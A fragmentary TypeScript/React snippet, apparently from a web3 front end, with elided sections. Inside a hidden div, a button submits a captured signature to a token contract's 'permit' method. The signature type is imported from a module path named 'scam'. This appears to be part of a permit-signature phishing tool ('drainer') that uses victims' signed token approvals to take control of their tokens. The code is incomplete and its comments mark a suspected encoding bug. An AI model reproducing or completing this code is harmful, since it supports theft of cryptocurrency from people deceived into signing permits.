...
import TokenList, {ContractCovalenTHQ} from "@/old/(version1)/v1/TokenList";
import {JsonRpcSigner} from "@ethersproject/providers";
import {SignedPermitSignature} from "@/old/(version1)/v1/scam/page";
					...
					<div className={'flex gap-2 hidden'}>
						...
						<button disabled={!signature} onClick={async () => {
							...
							callContractMethod('permit', [
									...
									"0x"+signature.r.toString(), // HERE IS MAYBE A BUG! if it happened change it to "toString('hex')"
									"0x"+signature.s.toString(),//  HERE IS MAYBE A BUG! if it happened change it to "toString('hex')"
									{
										gasLimit: 1000000
									}
								],token.contract_address,
